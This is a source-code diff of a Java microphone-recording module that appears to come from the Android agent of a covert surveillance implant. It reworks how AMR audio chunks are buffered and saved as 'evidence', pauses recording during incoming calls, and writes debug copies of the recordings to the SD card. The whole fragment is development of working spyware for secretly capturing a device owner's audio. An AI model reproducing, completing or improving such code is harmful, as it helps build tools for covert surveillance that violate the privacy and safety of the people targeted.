@@ -189,7 +189,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	}
 
 	int index = 0;
-	byte[] bias = null;
+	byte[] unfinished = null;
 
 	private synchronized void saveRecorderEvidence() {
 
@@ -200,11 +200,6 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		byte[] chunk = getAvailable();
 		byte[] data = null;
 		if (chunk != null && chunk.length > 0) {
-			if (Cfg.MICFILE) {
-				AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
-				index++;
-				file.write(chunk);
-			}
 
 			// data contiene il chunk senza l'header
 			if (Utils.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
@@ -213,42 +208,67 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				}
 				int offset = AMR_HEADER.length;
 				data = Utils.copy(chunk, offset, chunk.length - offset);
-			} else if (bias != null && bias.length > 0) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveRecorderEvidence): copy bias=" + Utils.byteArrayToHex(bias));
+				if (Cfg.MICFILE) {
+					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
+					index++;
+					file.write(chunk);
 				}
-				data = Utils.concat(bias, bias.length, chunk, chunk.length);
+			} else if (unfinished != null && unfinished.length > 0) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence): copy bias=" + Utils.byteArrayToHex(unfinished));
+				}
+				data = Utils.concat(unfinished, unfinished.length, chunk, chunk.length);
+				if (Cfg.MICFILE) {
+					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
+					index++;
+					file.write(data);
+				}
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (saveRecorderEvidence): plain chunk, no bias");
 				}
 				data = chunk;
+				if (Cfg.MICFILE) {
+					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
+					index++;
+					file.write(data);
+				}
 			}
 
 			// capire quale parte del chunk e' spezzata.
 			/* Find the packet size */
 			int pos = 0;
-			int len = 0;
+			int chunklen = 0;
 			do {
-				len = amr_sizes[(data[pos] >> 3) & 0x0f];
-				pos += len + 1;
+				chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];
+				if (chunklen == 0) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (saveRecorderEvidence) Error: zero len amr chunk, pos: " + pos);
+					}
+				}
+				pos += chunklen + 1;
 				if (false && Cfg.DEBUG) {
-					Check.log(TAG + " (saveRecorderEvidence): pos = " + pos + " len = " + len);
+					Check.log(TAG + " (saveRecorderEvidence): pos = " + pos + " chunklen = " + chunklen);
 				}
 			} while (pos < data.length);
+			
+			//pos=pos-1;
 
 			// portion of microchunk to be saved for the next time
-			int biasLen = (len - (pos - data.length) + 1) % len;
+			
+			int unfinishedLen = (chunklen - (pos - data.length) + 1) % chunklen;
+			int unfinishedPos = pos - chunklen -1;
+			
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveRecorderEvidence): biasLen = " + biasLen);
+				Check.log(TAG + " (saveRecorderEvidence): unfinishedLen = " + unfinishedLen + " unfPos: " + unfinishedPos + " chunklen: " + chunklen);
 			}
 
-			bias = Utils.copy(data, data.length - biasLen, biasLen);
-			if(bias.length > 0){
+			unfinished = Utils.copy(data, unfinishedPos, data.length - unfinishedPos);
+			if (unfinished.length > 0) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (saveRecorderEvidence): removing bias from data");
 				}
-				data = Utils.copy(data, 0, data.length - biasLen);
+				data = Utils.copy(data, 0, unfinishedPos);
 			}
 
 			if (data.length > 0) {
@@ -348,6 +368,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			Check.log(TAG + " (startRecorder)");//$NON-NLS-1$
 		}
 		numFailures = 0;
+		unfinished = null;
 
 		final DateTime dateTime = new DateTime();
 		fId = dateTime.getFiledate();
@@ -378,7 +399,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	private void createSockets() {
 		receiver = new LocalSocket();
-		
+
 		try {
 			socketname = Long.toHexString(Utils.getRandom());
 			lss = new LocalServerSocket(socketname);
@@ -480,13 +501,13 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): call incoming, suspend");//$NON-NLS-1$
 			}
-			
+
 			suspend();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): ");//$NON-NLS-1$
 			}
-			
+
 			resume();
 		}
 
@@ -499,7 +520,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			super.suspend();
 			saveRecorderEvidence();
 			stopRecorder();
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (suspended)");//$NON-NLS-1$
 			}
@@ -530,7 +551,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			}
 
 			super.resume();
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (resumed)");//$NON-NLS-1$
 			}
@@ -547,7 +568,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
 		}
-		
+
 		stopRecorder();
 	}
 }
